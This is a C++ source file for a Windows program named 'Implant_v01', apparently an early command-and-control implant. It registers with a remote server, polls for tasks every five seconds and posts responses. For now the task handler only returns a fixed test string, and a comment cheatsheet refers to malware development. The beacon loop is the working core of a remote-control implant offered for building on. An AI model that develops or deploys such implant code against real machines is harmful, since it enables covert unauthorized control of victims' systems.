// Implant_v01.cpp : Defines the entry point for the application.
//

/*
 * ======================================================================================
 * C++ VARIABLE NAMING CHEATSHEET/Standard
 * ======================================================================================
 * * 1. LOCAL VARIABLES/Funcs
 * ------------------
 * Google/STL Style : snake_case        (e.g., buffer_size, retry_count)
 * * 2. CLASS MEMBER VARIABLES
 * -------------------------
 * Google Style     : snake_case_       (e.g., buffer_size_, is_connected_)
 * * 3. POINTERS & HANDLES (Common in WinAPI/Malware Dev)
 * ----------------------------------------------------
 * pVariable        : Pointer           (e.g., pBuffer, pContext)
 * ppVariable       : Pointer to Ptr    (e.g., ppOutput)
 * hVariable        : Handle            (e.g., hProcess, hFile)
 * szVariable       : String (Zero term)(e.g., szTargetIp)
 * lpVariable       : Long Pointer      (e.g., lpPayload)
 * * 4. GLOBALS & STATICS
 * --------------------
 * Global           : g_camelCase       (e.g., g_configManager)
 * Static Member    : s_camelCase       (e.g., s_instanceCount)
 * * 5. CONSTANTS & MACROS
 * ---------------------
 * Constants        : kPascalCase       (e.g., kMaxRetries)
 * Macros           : SCREAMING_SNAKE   (e.g., MAX_BUFFER_SIZE, ENABLE_DEBUG)
 * * ======================================================================================
 */

#include <iostream>
#include <windows.h>
#include "Implant_v01.h"
#include "tests/test.h"
#include "lifecycle/comms.h"
#include "data/msgpack/msgpack.h"

int temp_loop() {
    //note - do a while not registered?
    //std::string implant_uuid = register_implant();
    //swithcing to a get with a null uuid
    nlohmann::json implant_uuid_data = get("00000000-0000-0000-0000-000000000000");
    //extract implant_uuid from here
    std::string implant_uuid = implant_uuid_data["implant_uuid"];
    std::cout << "Implant UUID: " << implant_uuid << std::endl;

    if (implant_uuid.empty()) {
        std::cerr << "Failed to register implant. Exiting." << std::endl;
        return -1;
    }

    while (1) {
        nlohmann::json task_data = get(implant_uuid);
        std::cout << "AFTER GET" << std::endl;

        // [SAFETY CHECK] 
        // 1. Is the JSON valid (not null)?
        // 2. Does it contain the task_uuid key?
        // 3. Is the value actually a string?
        if (!task_data.is_null() && task_data.contains("task_uuid") && task_data["task_uuid"].is_string())
        {
            std::string task_uuid = task_data["task_uuid"];
            std::cout << "Received Task: " << task_uuid << std::endl;

            // Execute Actions
            std::string text_data = "If you see this it means the implant is talking to you";

            // Prepare Response
            std::vector<uint8_t> task_response_as_msgpack;
            create_task_response(implant_uuid, task_uuid, text_data, task_response_as_msgpack);

            // POST Response
            post(implant_uuid, text_data, task_uuid); // Note: verify if post needs text_data or the msgpack buffer
        }
        else {
            // This handles cases where:
            // 1. HTTP_GET failed
            // 2. Server sent "No Content"
            std::cout << "No task or failed request. Sleeping..." << std::endl;
        }

        Sleep(5000);
        //Sleep([[ sleep_time ]])
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::cout << "hello" << std::endl;

    //for debugging/sanity check, run all tests first. Remove for production use.
    test_all();

    temp_loop();

    return 0;
}

